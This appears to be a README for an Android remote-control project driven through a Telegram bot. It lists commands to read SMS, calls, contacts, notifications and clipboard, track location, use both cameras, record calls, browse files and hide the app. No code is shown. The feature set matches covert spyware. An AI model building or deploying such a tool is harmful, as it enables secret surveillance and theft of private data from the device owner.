# Al-Zahra v4.1

Full Remote Control Project for Android

## Components
- Android App (Kotlin)
- Telegram Bot 200+ commands (Python)
- Web Dashboard
- Link Code System
- Auto GitHub Push

## Quick Start
cd server
pip3 install aiohttp psutil
python3 bot.py

## Commands
sms, calls, contacts, notifications
location, camera_front, camera_back
record_call, files, apps, clipboard
info, hide, lock, alarm, vibrate
wifi, bluetooth, flashlight
battery, brightness, volume

## Link
1. Open bot /link
2. Enter code in app
3. Done!
